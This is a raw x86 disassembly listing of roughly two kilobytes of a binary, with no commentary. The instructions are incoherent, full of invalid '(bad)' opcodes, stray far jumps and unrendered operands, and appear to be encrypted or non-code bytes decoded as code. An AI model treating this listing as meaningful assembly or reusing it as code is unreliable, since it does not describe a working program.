  40ec9c:	call   0x68fb:0x71184ea5
  40eca3:	jbe    0x40ecbc
  40eca5:	adc    DWORD PTR [esi+0x65b2c914],0xb268eda4
  40ecaf:	add    BYTE PTR [bp-0xf],0x34
  40ecb4:	retf   0xcd8c
  40ecb7:	xlat   BYTE PTR ds:[ebx]
  40ecb8:	into   
  40ecb9:	pusha  
  40ecba:	pop    esi
  40ecbb:	pop    ds
  40ecbc:	jmp    0x873a:0x38cb9ac
  40ecc3:	xor    eax,0x9fdeb61d
  40ecc8:	cmp    dl,ch
  40ecca:	shr    BYTE PTR [ecx+0x7bb64c2f],1
  40ecd0:	add    edx,ebx
  40ecd2:	jb     0x40ecc1
  40ecd4:	dec    BYTE PTR [ebx+0x26985be4]
  40ecda:	lahf   
  40ecdb:	rol    ah,1
  40ecdd:	or     ebp,esi
  40ecdf:	lods   eax,DWORD PTR ds:[esi]
  40ece0:	mov    ebx,0xe312f10d
  40ece5:	or     al,0xdd
  40ece7:	mul    BYTE PTR ds:0xb95a90c4
  40eced:	std    
  40ecee:	add    BYTE PTR [esi+0x48],ch
  40ecf1:	mov    dl,0x8d
  40ecf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf4:	inc    ecx
  40ecf5:	stc    
  40ecf6:	dec    DWORD PTR ds:0x737f261d
  40ecfc:	and    eax,0xc82026d4
  40ed01:	xchg   esi,eax
  40ed02:	and    cl,ah
  40ed04:	aad    0x23
  40ed06:	jl     0x40ed7a
  40ed08:	jbe    0x40ece6
  40ed0a:	sub    al,0x60
  40ed0c:	loope  0x40ed4e
  40ed0e:	sub    al,0xe1
  40ed10:	sbb    eax,0x45726988
  40ed15:	imul   ebx,DWORD PTR [edi-0x41],0xe191aec7
  40ed1c:	xor    al,0x70
  40ed1e:	dec    ebx
  40ed1f:	loop   0x40ecf3
  40ed21:	mov    dh,0x88
  40ed23:	add    eax,0xcee68970
  40ed28:	gs push 0x34
  40ed2b:	inc    ebx
  40ed2c:	jmp    0xa0e8:0x86629f0f
  40ed33:	pop    ds
  40ed34:	js     0x40ed1b
  40ed36:	stc    
  40ed37:	mov    eax,ds:0x6c4cf5b1
  40ed3c:	fbstp  TBYTE PTR [edx]
  40ed3e:	and    eax,0x15a00b7d
  40ed43:	adc    dl,dh
  40ed45:	bound  ebx,QWORD PTR [edx+ecx*4+0x2757bb5b]
  40ed4c:	test   esi,ecx
  40ed4e:	mov    BYTE PTR fs:[edi+0x4],bh
  40ed52:	sub    ch,BYTE PTR [ecx+eiz*1]
  40ed55:	leave  
  40ed56:	ins    BYTE PTR es:[edi],dx
  40ed57:	mov    ebx,DWORD PTR [edi+0x6d400c51]
  40ed5d:	add    esi,ebp
  40ed5f:	iret   
  40ed60:	lods   al,BYTE PTR ds:[esi]
  40ed61:	lds    esp,FWORD PTR [edi-0x16]
  40ed64:	ficom  WORD PTR [edi+0x3]
  40ed67:	test   eax,0xc74180dc
  40ed6c:	xor    al,0xaf
  40ed6e:	mov    esp,0xe8433d1a
  40ed73:	int3   
  40ed74:	pop    eax
  40ed75:	mov    edx,0x3f5f375d
  40ed7a:	or     DWORD PTR [esi+ecx*2+0xb],edx
  40ed7e:	and    BYTE PTR [edi+0x34b927a4],ah
  40ed84:	aad    0xc2
  40ed86:	mov    ah,0x16
  40ed88:	je     0x40ed3c
  40ed8a:	(bad)  
  40ed8b:	adc    ch,ch
  40ed8d:	pop    DWORD PTR [eax]
  40ed8f:	add    esp,DWORD PTR ds:[eax+ebx*2]
  40ed93:	mov    bh,0x89
  40ed95:	(bad)  
  40ed96:	test   al,0xa0
  40ed98:	ins    BYTE PTR es:[edi],dx
  40ed99:	sub    edi,DWORD PTR [esi-0x37]
  40ed9c:	or     DWORD PTR [ebp+edi*8-0x64e6a7d4],ebp
  40eda3:	mov    ds:0x983ef5f9,al
  40eda8:	and    esi,DWORD PTR ds:0xf688df86
  40edae:	test   esp,esp
  40edb0:	xchg   edi,eax
  40edb1:	dec    esp
  40edb2:	xchg   ebp,eax
  40edb3:	mov    al,0xe9
  40edb5:	ret    0x246c
  40edb8:	push   es
  40edb9:	(bad)  
  40edba:	mov    edx,0xbbced03a
  40edbf:	sub    eax,0x31b94308
  40edc4:	mov    eax,0xef037b23
  40edc9:	xchg   ecx,eax
  40edca:	pop    eax
  40edcb:	add    al,BYTE PTR [edx-0x4afefdee]
  40edd1:	out    0xab,al
  40edd3:	jge    0x40ee2c
  40edd5:	repnz retf 0x4928
  40edd9:	ret    
  40edda:	sub    al,0xc8
  40eddc:	sti    
  40eddd:	sub    al,0x35
  40eddf:	add    eax,0x92b05e94
  40ede4:	mov    cl,0x4f
  40ede6:	cmp    ch,BYTE PTR [ecx+edi*2]
  40ede9:	cmp    ch,BYTE PTR [ebp+0x3c]
  40edec:	iret   
  40eded:	pop    eax
  40edee:	loopne 0x40ee30
  40edf0:	jp     0x40ee0b
  40edf2:	int    0xbe
  40edf4:	clc    
  40edf5:	test   al,0x4e
  40edf7:	imul   ecx,DWORD PTR [bp+0x7fce],0x7ea42274
  40ee00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee01:	outs   dx,DWORD PTR ds:[esi]
  40ee02:	sbb    bl,BYTE PTR [esi]
  40ee04:	adc    al,0x9f
  40ee06:	mov    ebx,0x272ac302
  40ee0b:	scas   eax,DWORD PTR es:[edi]
  40ee0c:	das    
  40ee0d:	pushf  
  40ee0e:	aam    0xcb
  40ee10:	xchg   edx,eax
  40ee11:	inc    edi
  40ee12:	bnd fs call 0x68c11654
  40ee19:	cmp    BYTE PTR [ebp-0x3d7e54b1],dh
  40ee1f:	pop    ebx
  40ee20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee21:	adc    bh,ch
  40ee23:	xchg   BYTE PTR [edi-0xf],bl
  40ee26:	and    ebx,DWORD PTR [edi]
  40ee28:	retf   0xa6a6
  40ee2b:	dec    ebp
  40ee2c:	fadd   DWORD PTR [ebp+ebx*2-0x2b9a328]
  40ee33:	jle    0x40edcd
  40ee35:	pop    ebx
  40ee36:	xchg   BYTE PTR [esi-0x7d796a7f],ch
  40ee3c:	sub    BYTE PTR [ebx],bh
  40ee3e:	jno    0x40ee4a
  40ee40:	inc    esp
  40ee41:	xchg   esi,eax
  40ee42:	dec    esi
  40ee43:	loopne 0x40ee3e
  40ee45:	sub    al,0x66
  40ee47:	leave  
  40ee48:	dec    ebp
  40ee49:	(bad)  
  40ee4a:	jg     0x40ee7d
  40ee4c:	mov    eax,ds:0x98532505
  40ee51:	ss add bl,dl
  40ee54:	jne    0x40ee3c
  40ee56:	clc    
  40ee57:	push   edi
  40ee58:	push   0xbd19d738
  40ee5d:	inc    edi
  40ee5e:	sub    DWORD PTR [esi],0x65cfe179
  40ee64:	or     eax,edx
  40ee66:	mov    cl,0x63
  40ee68:	mov    dl,0x15
  40ee6a:	imul   esp,edi,0xb25f2ffc
  40ee70:	add    ebp,DWORD PTR [esi+0x43]
  40ee73:	fild   DWORD PTR ds:0xdd35aa95
  40ee79:	in     al,dx
  40ee7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7b:	aaa    
  40ee7c:	scas   eax,DWORD PTR es:[edi]
  40ee7d:	icebp  
  40ee7e:	div    DWORD PTR [esi]
  40ee80:	push   ss
  40ee81:	jo     0x61659709
  40ee87:	int3   
  40ee88:	mov    esi,0xe0924971
  40ee8d:	push   cs
  40ee8e:	xor    ebx,eax
  40ee90:	inc    esi
  40ee91:	arpl   WORD PTR [edx-0x3181eebc],cx
  40ee97:	mov    eax,DWORD PTR [ecx+0x61]
  40ee9a:	dec    eax
  40ee9b:	inc    ecx
  40ee9c:	mov    dl,0x86
  40ee9e:	icebp  
  40ee9f:	pop    edx
  40eea0:	das    
  40eea1:	xchg   esi,eax
  40eea2:	cmp    dl,BYTE PTR [esi+0x6629d44f]
  40eea8:	sbb    DWORD PTR [edi],edx
  40eeaa:	adc    BYTE PTR [eax+ebp*2],ch
  40eead:	dec    edi
  40eeae:	jg     0x40eebd
  40eeb0:	mov    ch,0x7a
  40eeb2:	sti    
  40eeb3:	pop    ecx
  40eeb4:	add    ah,bl
  40eeb6:	xchg   DWORD PTR [ebx+esi*1],ebp
  40eeb9:	or     al,0x59
  40eebb:	stos   BYTE PTR es:[edi],al
  40eebc:	cld    
  40eebd:	xlat   BYTE PTR gs:[ebx]
  40eebf:	dec    ebx
  40eec0:	sbb    ebx,DWORD PTR [ebx-0x711f5dd]
  40eec6:	push   esi
  40eec7:	pusha  
  40eec8:	fwait
  40eec9:	test   BYTE PTR [eax+0x4c753ec0],bl
  40eecf:	lea    eax,[esi]
  40eed1:	cdq    
  40eed2:	push   ecx
  40eed3:	frstor [ebp-0x5101a13b]
  40eed9:	cmp    edi,DWORD PTR ds:0x2e43f7db
  40eedf:	aad    0xde
  40eee1:	test   DWORD PTR ds:0x5cbf7c14,esp
  40eee7:	sub    al,0x1e
  40eee9:	pushf  
  40eeea:	sub    bl,bh
  40eeec:	pop    esi
  40eeed:	leave  
  40eeee:	std    
  40eeef:	dec    edi
  40eef0:	test   al,0xb
  40eef2:	mov    ch,0x82
  40eef4:	mov    BYTE PTR [ebp+0x3c246aa],dl
  40eefa:	mov    BYTE PTR [ebp+0x715f9f32],0x7
  40ef01:	arpl   WORD PTR [ecx],si
  40ef03:	inc    ebp
  40ef04:	mov    bh,0xf5
  40ef06:	inc    eax
  40ef07:	iret   
  40ef08:	push   0xfc502be3
  40ef0d:	pop    edi
  40ef0e:	xchg   ecx,eax
  40ef0f:	and    esi,DWORD PTR ds:0xda0d141e
  40ef16:	cmc    
  40ef17:	adc    al,0xc5
  40ef19:	lea    edx,[eax]
  40ef1b:	retf   0xef13
  40ef1e:	jle    0x40eef5
  40ef20:	mov    dl,BYTE PTR [edi-0x22530091]
  40ef26:	lock xchg esp,eax
  40ef28:	das    
  40ef29:	adc    al,BYTE PTR [edx+0x5835e0e7]
  40ef2f:	jle    0x40efa3
  40ef31:	mov    ss,WORD PTR ds:[esi+0x27]
  40ef35:	jae    0x40ef86
  40ef37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef38:	mov    esi,0xd5425534
  40ef3d:	xchg   edx,eax
  40ef3e:	test   al,0xd8
  40ef40:	xchg   esp,eax
  40ef41:	(bad)  
  40ef42:	sahf   
  40ef43:	jg     0x40ef82
  40ef45:	pop    es
  40ef46:	scas   al,BYTE PTR es:[edi]
  40ef47:	xchg   ebp,eax
  40ef48:	pushf  
  40ef49:	in     eax,dx
  40ef4a:	test   eax,0x1dd756fa
  40ef4f:	or     eax,0x832669bf
  40ef54:	pop    edi
  40ef55:	dec    edx
  40ef56:	repnz inc ebp
  40ef58:	sub    dh,BYTE PTR [ebx-0x5b]
  40ef5b:	or     eax,0x1eef1a52
  40ef60:	out    0x51,al
  40ef62:	jne    0x40efa1
  40ef64:	fsub   DWORD PTR [ebp-0x3b9ebecb]
  40ef6a:	mov    BYTE PTR [ecx],dh
  40ef6c:	push   edi
  40ef6d:	(bad)  
  40ef6e:	mov    WORD PTR [eax+0x9],ds
  40ef71:	jne    0x40ef11
  40ef73:	xchg   ebp,eax
  40ef74:	and    al,0xfa
  40ef76:	xchg   esi,eax
  40ef77:	adc    ecx,DWORD PTR [edx+0x4cb08a38]
  40ef7d:	mov    ch,0x1d
  40ef7f:	(bad)  
  40ef80:	mov    al,0xd9
  40ef82:	mov    esi,0xb5c4646b
  40ef87:	(bad)  
  40ef88:	fild   WORD PTR [ecx+ebx*8]
  40ef8b:	adc    eax,0x1496bc09
  40ef90:	js     0x40ef95
  40ef92:	pop    edx
  40ef93:	inc    ecx
  40ef94:	or     al,0xb5
  40ef96:	les    esi,FWORD PTR [edx-0x70]
  40ef99:	sti    
  40ef9a:	loop   0x40ef49
  40ef9c:	nop
  40ef9d:	test   al,0x8c
  40ef9f:	jmp    0x40ef9f
  40efa1:	nop
  40efa2:	setno  BYTE PTR [edi-0x71]
  40efa6:	mov    edx,0xce64e047
  40efab:	sbb    BYTE PTR [ebp+0x20],ch
  40efae:	int    0x3c
  40efb0:	and    bh,BYTE PTR [edx+edx*2]
  40efb3:	adc    bh,BYTE PTR [esi]
  40efb5:	push   eax
  40efb6:	fadd   st,st(7)
  40efb8:	jmp    0xcd46:0xf942a9be
  40efbf:	je     0x40f037
  40efc1:	and    DWORD PTR [ecx],ebp
  40efc3:	aaa    
  40efc4:	pop    esi
  40efc5:	pushf  
  40efc6:	in     al,dx
  40efc7:	jp     0x40f01c
  40efc9:	int3   
  40efca:	gs or  al,0x2a
  40efcd:	outs   dx,DWORD PTR ds:[esi]
  40efce:	retf   0x5ca
  40efd1:	push   esi
  40efd2:	pop    ds
  40efd3:	loopne 0x40ef5d
  40efd5:	cli    
  40efd6:	rcl    BYTE PTR [eax+0x30bc587e],1
  40efdc:	mov    ecx,fs
  40efde:	push   es
  40efdf:	fistp  WORD PTR [edx]
  40efe1:	pop    es
  40efe2:	leave  
  40efe3:	push   edi
  40efe4:	(bad)
  40efe7:	adc    ebx,DWORD PTR [eax]
  40efe9:	mov    dl,0x4d
  40efeb:	jmp    ecx
  40efed:	shl    BYTE PTR [eax],1
  40efef:	not    DWORD PTR [ebx-0x33c71af1]
  40eff5:	out    0x92,al
  40eff7:	xchg   edi,eax
  40eff8:	mov    dl,0x65
  40effa:	shr    dh,0x5e
  40effd:	push   es
  40effe:	pop    ecx
  40efff:	cwde   
  40f000:	pop    edi
  40f001:	jnp    0x40ef9d
  40f003:	outs   dx,DWORD PTR ds:[esi]
  40f004:	neg    BYTE PTR [eax-0x34]
  40f007:	outs   dx,BYTE PTR ds:[esi]
  40f008:	xchg   ecx,eax
  40f009:	dec    edx
  40f00a:	mov    dh,0xd6
  40f00c:	mov    edx,0x4a231e55
  40f011:	and    bh,BYTE PTR [edx]
  40f013:	std    
  40f014:	mov    al,0xc9
  40f016:	mov    cl,0x9
  40f018:	ins    DWORD PTR es:[edi],dx
  40f019:	jle    0x40f04f
  40f01b:	gs and al,dl
  40f01e:	sub    ebx,esi
  40f020:	sub    DWORD PTR [ebx],edi
  40f022:	pop    esi
  40f023:	stc    
  40f024:	in     al,dx
  40f025:	out    dx,eax
  40f026:	shl    DWORD PTR [ecx+0x60e42163],cl
  40f02c:	out    dx,al
  40f02d:	cli    
  40f02e:	(bad)  
  40f030:	xchg   bl,bl
  40f032:	aaa    
  40f033:	fcomip st,st(7)
  40f035:	jns    0x40f062
  40f037:	push   ebp
  40f038:	inc    esp
  40f039:	test   eax,0x5f56281c
  40f03e:	pop    es
  40f03f:	aam    0x3
  40f041:	rsqrtps xmm0,xmm3
  40f044:	mov    ebx,0xe7db38e0
  40f049:	rol    BYTE PTR [ebx],cl
  40f04b:	mov    ah,BYTE PTR [esi+0x474596d8]
  40f051:	jp     0x40f072
  40f053:	push   ebp
  40f054:	mov    esp,0x4a641c52
  40f059:	call   0x250855b
  40f05e:	push   edx
  40f05f:	ins    DWORD PTR es:[edi],dx
  40f060:	add    eax,0x879d905
  40f065:	mov    esp,0x6f377cfd
  40f06a:	jne    0x40f052
  40f06c:	in     eax,0x88
  40f06e:	pop    edx
  40f06f:	adc    al,0x92
  40f071:	push   cs
  40f072:	sbb    al,0x56
  40f074:	out    dx,al
  40f075:	inc    esp
  40f076:	mov    DWORD PTR [esi+0xa4f1d9e],ecx
  40f07c:	cmp    esi,DWORD PTR [eax+0x5]
  40f07f:	xchg   ebx,eax
  40f080:	cmp    al,BYTE PTR ds:0xf3ae650d
  40f086:	sbb    edi,DWORD PTR [edx]
  40f088:	add    BYTE PTR [esi+0x7a2c2783],0x6f
  40f08f:	in     eax,dx
  40f090:	mov    al,ds:0x6f177681
  40f095:	scas   al,BYTE PTR es:[edi]
  40f096:	enter  0x2d1f,0x6c
  40f09a:	mov    dh,0x84
  40f09c:	imul   edx,DWORD PTR [ebx-0x291b19c6],0x7046bc50
  40f0a6:	mov    ecx,0x821fea0a
  40f0ab:	fcomip st,st(6)
  40f0ad:	push   ebp
  40f0ae:	or     eax,0x794ee7ca
  40f0b3:	stos   BYTE PTR es:[edi],al
  40f0b4:	imul   esp,DWORD PTR [edi-0x9eb2c60],0xb579fcff
  40f0be:	push   ss
  40f0bf:	aas    
  40f0c0:	call   0xd7c2:0x127d6aa9
  40f0c7:	(bad)  
  40f0c8:	call   DWORD PTR [ecx-0x67]
  40f0cb:	jmp    0x3f0b1a03
  40f0d0:	add    al,0x2e
  40f0d2:	push   eax
  40f0d3:	push   0x2c201eb7
  40f0d8:	jp     0x40f088
  40f0da:	mov    ch,bh
  40f0dc:	cbw    
  40f0de:	or     al,0x86
  40f0e0:	cmp    eax,DWORD PTR [edi-0x727a5b1e]
  40f0e6:	jns    0x40f0b4
  40f0e8:	sbb    DWORD PTR [ecx-0x28e963af],esi
  40f0ee:	xchg   ebp,eax
  40f0ef:	adc    al,0x57
  40f0f1:	pop    ds
  40f0f2:	das    
  40f0f3:	in     eax,dx
  40f0f4:	repz adc bh,ah
  40f0f7:	xor    ah,BYTE PTR [edi-0x6140dbe]
  40f0fd:	lahf   
  40f0fe:	cmp    BYTE PTR [ecx+0x475a71e8],cl
  40f104:	push   ss
  40f105:	aas    
  40f106:	lods   al,BYTE PTR ds:[esi]
  40f107:	fild   WORD PTR [eax+0x38]
  40f10a:	cmp    DWORD PTR [ebx+eiz*1-0x2d9b4b69],edi
  40f111:	mul    DWORD PTR [ebx-0x2a643231]
  40f117:	mov    dl,0x63
  40f119:	dec    edi
  40f11a:	mov    edi,0xb9a60f36
  40f11f:	inc    esp
  40f120:	jmp    0x23ee:0xbe515932
  40f127:	ficomp WORD PTR [ebx]
  40f129:	fcom   QWORD PTR [edx-0x6905a774]
  40f12f:	sub    eax,0xb4a8b48c
  40f134:	aaa    
  40f135:	push   esp
  40f136:	scas   al,BYTE PTR es:[edi]
  40f137:	dec    esp
  40f138:	enter  0xabc3,0x2
  40f13c:	pop    esi
  40f13d:	mov    ch,0xc4
  40f13f:	or     DWORD PTR [edx-0x72],esi
  40f142:	push   esp
  40f143:	aaa    
  40f144:	mov    ?,WORD PTR [ebx]
  40f146:	pop    esp
  40f147:	jnp    0x40f0cd
  40f149:	mov    ds:0x75b86770,eax
  40f14e:	(bad)  
  40f14f:	neg    BYTE PTR [ecx]
  40f151:	xchg   edi,eax
  40f152:	pop    edi
  40f153:	mov    esp,0xbf660c6c
  40f158:	adc    eax,0xdb58751d
  40f15d:	int3   
  40f15e:	stos   DWORD PTR es:[edi],eax
  40f15f:	cmp    eax,0x448dfd0d
  40f164:	xchg   ebp,eax
  40f165:	cmp    bh,al
  40f167:	inc    ecx
  40f168:	nop
  40f169:	and    dl,BYTE PTR [ecx]
  40f16b:	inc    ebx
  40f16c:	stos   DWORD PTR es:[edi],eax
  40f16d:	mov    al,0xa9
  40f16f:	loope  0x40f134
  40f171:	sbb    al,BYTE PTR [ecx]
  40f173:	clc    
  40f174:	push   esi
  40f175:	or     dl,cl
  40f177:	scas   eax,DWORD PTR es:[edi]
  40f178:	cmp    esi,esi
  40f17a:	pop    es
  40f17b:	pop    eax
  40f17c:	loop   0x40f19b
  40f17e:	aas    
  40f17f:	mov    esi,0xf7f7ee4f
  40f184:	inc    ebp
  40f185:	daa    
  40f186:	cwde   
  40f187:	ins    DWORD PTR es:[edi],dx
  40f188:	in     al,0xf7
  40f18a:	(bad)  
  40f18b:	jnp    0x40f19c
  40f18d:	lea    ebp,es:[ecx+eax*2-0x36]
  40f192:	xchg   ebx,eax
  40f193:	xor    dl,0x5a
  40f196:	sti    
  40f197:	push   0x3f0d7bf2
  40f19c:	popa   
  40f19d:	or     ebp,esi
  40f19f:	in     al,dx
  40f1a0:	in     eax,0xa2
  40f1a2:	dec    esp
  40f1a3:	pop    ecx
  40f1a4:	lods   al,BYTE PTR ds:[esi]
  40f1a5:	loopne 0x40f1af
  40f1a7:	in     al,dx
  40f1a8:	lds    ebp,FWORD PTR [ebx+0x19]
  40f1ab:	out    0x84,eax
  40f1ad:	push   es
  40f1ae:	jmp    0xf554:0xc757733c
  40f1b5:	sub    eax,0x401fb0c0
  40f1ba:	xor    eax,0xd44bf163
  40f1bf:	mov    bh,0xad
  40f1c1:	stos   DWORD PTR es:[edi],eax
  40f1c2:	pop    ds
  40f1c3:	inc    ecx
  40f1c4:	jl     0x40f208
  40f1c6:	and    eax,0x2891b3d3
  40f1cb:	mov    dl,0xcc
  40f1cd:	mov    ds:0xe0c0abbf,eax
  40f1d2:	dec    eax
  40f1d3:	cmp    bh,bh
  40f1d5:	sub    BYTE PTR es:[esi+0x3b1ab157],0xe1
  40f1dd:	mov    dl,BYTE PTR [esi-0x14f768a1]
  40f1e3:	or     BYTE PTR [ecx-0x19],dl
  40f1e6:	sbb    eax,0xcdec47b2
  40f1eb:	mov    dh,0x7
  40f1ed:	jmp    0x9bca42a7
  40f1f2:	idiv   edi
  40f1f4:	pop    ebp
  40f1f5:	xchg   esp,eax
  40f1f6:	adc    esi,DWORD PTR [esi]
  40f1f8:	ins    DWORD PTR es:[edi],dx
  40f1f9:	ss scas al,BYTE PTR es:[edi]
  40f1fb:	dec    eax
  40f1fc:	hlt    
  40f1fd:	mov    bl,0x5f
  40f1ff:	clc    
  40f200:	inc    ebx
  40f201:	retf   0x6f6
  40f204:	inc    edi
  40f205:	adc    edx,esp
  40f207:	cli    
  40f208:	call   0x7a4e:0xcc36939d
  40f20f:	adc    eax,0x6b17ce21
  40f214:	imul   edx,DWORD PTR [edi],0x40838053
  40f21a:	hlt    
  40f21b:	mov    al,0x81
  40f21d:	adc    dh,BYTE PTR [eax]
  40f21f:	std    
  40f220:	push   edi
  40f221:	mov    bl,bl
  40f223:	gs or  edi,esp
  40f226:	test   eax,0xc0d45a4a
  40f22b:	cmp    BYTE PTR ds:0x677d1f60,0x5e
  40f232:	pop    esp
  40f233:	xor    ah,BYTE PTR [ebp-0x72d834d4]
  40f239:	lahf   
  40f23a:	jno    0x40f1f9
  40f23c:	pop    esp
  40f23d:	cmp    al,0xe2
  40f23f:	int3   
  40f240:	test   BYTE PTR [ebp-0x205a8385],bl
  40f246:	xchg   esi,eax
  40f247:	xchg   ch,dh
  40f249:	mov    ebx,0x6c99e3cd
  40f24e:	ret    
  40f24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f250:	mov    bh,0xe7
  40f252:	jnp    0x40f2cd
  40f254:	(bad)  
  40f255:	scas   eax,DWORD PTR es:[edi]
  40f256:	in     eax,0x9c
  40f258:	and    ah,BYTE PTR [eax+0x452673cd]
  40f25e:	xchg   edi,eax
  40f25f:	cwde   
  40f260:	and    ecx,ebp
  40f262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f263:	mov    ebp,0x4d2addc3
  40f268:	jbe    0x40f200
  40f26a:	das    
  40f26b:	adc    al,0x61
  40f26d:	out    dx,eax
  40f26e:	shr    BYTE PTR ds:0x8356612f,cl
  40f274:	pushf  
  40f275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f276:	jb     0x40f21e
  40f278:	ret    
  40f279:	mov    eax,ds:0xd76a3cb3
  40f27e:	pop    esp
  40f27f:	adc    DWORD PTR [ebx+0xc009592],ebx
  40f285:	ins    DWORD PTR es:[edi],dx
  40f286:	or     DWORD PTR [ecx+0xb],0x6e8230f4
  40f28d:	loop   0x40f288
  40f28f:	jnp    0x40f274
  40f291:	sahf   
  40f292:	mov    ebx,0x71ecc75f
  40f297:	sbb    ecx,0xffffff8a
  40f29a:	(bad)  
  40f29c:	addr16 inc edi
  40f29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f29f:	mov    dh,0xa1
  40f2a1:	scas   eax,DWORD PTR es:[edi]
  40f2a2:	les    ebp,FWORD PTR [esi+0x5]
  40f2a5:	loope  0x40f264
  40f2a7:	dec    ebp
  40f2a8:	mov    DWORD PTR ds:0xbd41f79b,ecx
  40f2ae:	adc    eax,0xa3cd5caf
  40f2b3:	out    dx,al
  40f2b4:	or     DWORD PTR [eax],ebp
  40f2b6:	mov    al,0x43
  40f2b8:	mov    WORD PTR ds:0x689999ef,?
  40f2be:	fisub  WORD PTR ds:0xb89324a5
  40f2c4:	dec    edx
  40f2c5:	fistp  DWORD PTR [ebx+0x60c50766]
  40f2cb:	lea    edi,[esi-0x6690cb36]
  40f2d1:	mov    ds:0x2aedab5f,eax
  40f2d6:	jmp    0x9c0b:0xbbb0d733
  40f2dd:	adc    al,0x6c
  40f2df:	sbb    esp,DWORD PTR [ebp-0x10]
  40f2e2:	fwait
  40f2e3:	pop    ebp
  40f2e4:	push   ebx
  40f2e5:	mov    WORD PTR [eax],ds
  40f2e7:	sbb    al,0xe9
  40f2e9:	call   0x5ad9:0x94385f49
  40f2f0:	inc    eax
  40f2f1:	add    BYTE PTR [edx*4-0x15af8caa],bl
  40f2f8:	hlt    
  40f2f9:	pop    edi
  40f2fa:	add    ch,BYTE PTR [edx+ebp*2-0x64]
  40f2fe:	inc    BYTE PTR [eax+0x66d26c9a]
  40f304:	add    bl,BYTE PTR [ebp+0x6352efd6]
  40f30a:	sbb    DWORD PTR [edi+0x61fc50f7],edi
  40f310:	add    BYTE PTR [ecx-0x45cbdb28],cl
  40f316:	jns    0x40f2cd
  40f318:	retf   
  40f319:	ds stos BYTE PTR es:[edi],al
  40f31b:	cli    
  40f31c:	(bad)  
  40f31d:	and    al,0x97
  40f31f:	sbb    al,BYTE PTR [ecx+edx*8]
  40f322:	iret   
  40f323:	por    mm2,mm4
  40f326:	cld    
  40f327:	sub    al,0x9a
  40f329:	fidiv  DWORD PTR [ebp+edx*4-0xdfcf1]
  40f330:	pop    edi
  40f331:	cmp    al,bh
  40f333:	mov    ebx,0xdc269a28
  40f338:	pop    edx
  40f339:	adc    eax,0x4e378650
  40f33e:	cmp    DWORD PTR [ecx],ebp
  40f340:	jae    0x40f376
  40f342:	and    eax,esi
  40f344:	inc    edx
  40f345:	rcl    BYTE PTR [ebx+0x3be1e12d],1
  40f34b:	and    DWORD PTR [ecx-0x659bf989],eax
  40f351:	int    0x74
  40f353:	xchg   BYTE PTR [edx+0x29],bl
  40f356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f357:	mov    eax,ds:0xe60c4230
  40f35c:	jg     0x40f310
  40f35e:	adc    BYTE PTR [edi-0x83c4d68],al
  40f364:	jb     0x40f2ef
  40f366:	std    
  40f367:	cs add eax,0xf9d65457
  40f36d:	cwde   
  40f36e:	add    al,0x4d
  40f370:	jne    0x40f361
  40f372:	jno    0x40f356
  40f374:	mov    ah,0xab
  40f376:	sub    DWORD PTR ds:[ebp-0x1d],ebp
  40f37a:	aas    
  40f37b:	mov    ebx,0xeb439d71
  40f380:	idiv   esi
  40f382:	mov    eax,esi
  40f384:	(bad)  
  40f386:	mov    esi,0xb94ba852
  40f38b:	xlat   BYTE PTR ds:[ebx]
  40f38c:	jp     0x40f3ea
  40f38e:	xchg   esp,eax
  40f38f:	in     al,0xb9
  40f391:	cmp    bl,BYTE PTR [esi+0x78]
  40f394:	jae    0x40f3d6
  40f396:	push   ss
  40f397:	push   0x1b86b05f
  40f39c:	loop   0x40f320
  40f39e:	xor    dh,0x9c
  40f3a1:	in     eax,0x1b
  40f3a3:	add    eax,0xbad0a6f3
  40f3a8:	add    dh,dh
  40f3aa:	push   0x22
  40f3ac:	xlat   BYTE PTR ds:[ebx]
  40f3ad:	jmp    0x40f3b2
  40f3af:	xor    DWORD PTR [esi+0x32e94e3e],eax
  40f3b5:	xchg   ebp,eax
  40f3b6:	and    cl,bl
  40f3b8:	dec    ebx
  40f3b9:	sub    DWORD PTR [ecx-0xb],eax
  40f3bc:	sub    bh,BYTE PTR [ecx]
  40f3be:	mov    ah,0x35
  40f3c0:	sub    eax,0x7933cbbe
  40f3c5:	dec    ebx
  40f3c6:	out    dx,eax
  40f3c7:	pop    ecx
  40f3c8:	jmp    0x1836:0x8bf6d98
  40f3cf:	fcmovu st,st(5)
  40f3d1:	nop
  40f3d2:	shr    bl,0x12
  40f3d5:	pop    ds
  40f3d6:	adc    al,0xa7
  40f3d8:	int3   
  40f3d9:	cs sbb eax,0xd64e7dfb
  40f3df:	stos   BYTE PTR es:[edi],al
  40f3e0:	imul   edx,DWORD PTR [ebp-0xcd0eb80],0x3f91c8ee
  40f3ea:	jo     0x40f374
  40f3ec:	les    esp,FWORD PTR [ecx]
  40f3ee:	mov    ds:0x560633b1,al
  40f3f3:	inc    esp
  40f3f4:	test   eax,0xf52775fa
  40f3f9:	test   eax,0xb3dea26
  40f3fe:	in     eax,0x5a
  40f400:	mov    eax,ds:0x9dbb32f0
  40f405:	inc    ebp
  40f406:	cli    
  40f407:	mov    edx,0xf10e0662
  40f40c:	and    BYTE PTR [edx-0x22],0x3a
  40f410:	gs xor ebp,edx
  40f413:	inc    eax
  40f414:	std    
  40f415:	ret    0xc024
  40f418:	and    BYTE PTR [ebp-0x1f],bl
  40f41b:	mov    dl,0xcf
  40f41d:	mov    ecx,0xa9b4ea7
  40f422:	pop    esi
  40f423:	dec    eax
  40f424:	dec    edi
  40f425:	repz scas al,BYTE PTR es:[edi]
  40f427:	loop   0x40f472
  40f429:	mov    edi,0x5b2cd868
  40f42e:	shl    edx,cl
  40f430:	pop    ecx
  40f431:	xor    edx,edi
  40f433:	jb     0x40f4a7
  40f435:	inc    eax
  40f436:	mov    al,0x76
  40f438:	xor    edi,edx
  40f43a:	call   edx
  40f43c:	fidiv  DWORD PTR [ecx+0x6e5b3db9]
  40f442:	sub    al,0x8b
  40f444:	jbe    0x40f452
  40f446:	test   eax,0x95bbe6e7
  40f44b:	mov    ds:0x105ca52b,eax
